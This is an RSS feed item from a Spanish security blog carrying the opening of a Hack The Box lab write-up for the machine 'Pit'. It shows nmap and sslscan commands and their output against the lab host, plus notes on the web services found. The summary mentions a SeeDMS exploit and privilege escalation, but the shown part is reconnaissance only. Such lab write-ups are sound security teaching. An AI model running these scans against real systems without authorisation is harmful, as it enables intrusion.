<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>centOS on sckull</title>
    <link>https://sckull.github.io/tags/centos/</link>
    <description>Recent content in centOS on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Sat, 25 Sep 2021 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/centos/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - Pit</title>
        <link>https://sckull.github.io/posts/pit/</link>
        <pubDate>Sat, 25 Sep 2021 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 25 Sep 2021 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/pit/</guid>
        <description>Pit corre snmp donde encontramos informacion que nos permitio explotar una vulnerabilidad en SeeDMS para lograr obtener acceso por Cockpit con contraseñas almacenadas.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/pit/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Pit corre snmp donde encontramos informacion que nos permitio explotar una vulnerabilidad en SeeDMS para lograr obtener acceso por Cockpit con contraseñas almacenadas. Finalmente escalamos privilegios utilizando un script que encontramos en snmp.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/346&#34;&gt;Pit&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.241&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/159204&#34;&gt;polarbearer&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/159204&#34; class=&#34;img_user_maker&#34;/&gt; &lt;/p&gt; &lt;hr style=&#34;opacity:25%;&#34;&gt; &lt;p class=&#34;user_maker2&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/125033&#34;&gt;GibParadox&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/125033&#34; class=&#34;img_user_maker&#34;/&gt; &lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[7.2, 4.7, 4.3, 5.7, 5.3],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos con nmap nos muestra el puerto http (80), ssh (22) y el puerto http/s (9090) abiertos, además se muestra un dominio.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Tue May 18 18:03:29 2021 as: nmap -Pn -sC -sV -p22,80,9090 -oN scan_ports 10.10.10.241&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.241 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.241&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.071s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;3072&lt;/span&gt; 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http            nginx 1.14.1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: nginx/1.14.1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Test Page &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin?
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   GetRequest, HTTPOptions:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; Bad request
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;utf8
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Transfer-Encoding: chunked
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     X-DNS-Prefetch-Control: off
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Referrer-Policy: no-referrer
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     X-Content-Type-Options: nosniff
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Cross-Origin-Resource-Policy: same-origin
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!DOCTYPE html&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;html&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;head&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;title&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     request
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;/title&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;meta http-equiv&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;text/html; charset=utf-8&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;meta &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;style&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     body &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     margin: 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     font-family: &lt;span class=&#34;s2&#34;&gt;&amp;#34;RedHatDisplay&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;Open Sans&amp;#34;&lt;/span&gt;, Helvetica, Arial, sans-serif&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     font-size: 12px&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     line-height: 1.66666667&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     color: &lt;span class=&#34;c1&#34;&gt;#333333;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     background-color: &lt;span class=&#34;c1&#34;&gt;#f5f5f5;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     border: 0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     vertical-align: middle&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     font-weight: 300&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    margin: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 10p
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;dms-pit.htb/organizationName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;4cd9329523184b0ea52ba0d20a1a6f92/countryName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;US
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2020-04-16T23:29:12
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2030-06-04T16:09:12
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: TLS randomness does not represent &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.91%T&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;SSL%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5/18%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;60A439EF%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gn
SF:u%r&lt;span class=&#34;o&#34;&gt;([&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;);
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;# Nmap done at Tue May 18 18:06:42 2021 -- 1 IP address (1 host up) scanned in 193.85 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;sslscan&#34;&gt;SSLScan&lt;/h2&gt;
&lt;p&gt;Verificamos con SSLSCAN los dominios en el certificado.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;π ~/htb/pit ❯ sslscan 10.10.10.241:9090&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;tail
  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt;

Subject:  dms-pit.htb
Altnames: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
Issuer:   dms-pit.htb

Not valid before: Apr &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; 23:29:12 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; GMT
Not valid after:  Jun  &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; 16:09:12 &lt;span class=&#34;m&#34;&gt;2030&lt;/span&gt; GMT
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos el index de nginx en lo que parece ser la version de Red Hat.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pit/Screenshot_20210519_221250.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El dominio &lt;code&gt;dms-pit.htb&lt;/code&gt; no muestra nada y al ejecutar gobuster no muestra direcciones.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pit/Screenshot_20210519_233850.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
